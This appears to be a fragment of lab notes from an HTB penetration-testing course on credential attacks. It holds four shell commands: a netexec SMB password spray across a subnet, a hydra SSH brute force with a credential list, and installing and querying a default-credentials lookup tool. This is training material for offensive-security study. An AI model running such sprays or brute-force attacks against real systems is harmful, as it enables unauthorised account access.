...
```shell-session
xF1NN@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```
...
```shell-session
xF1NN@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```
...
```shell-session
xF1NN@htb[/htb]$ creds search linksys
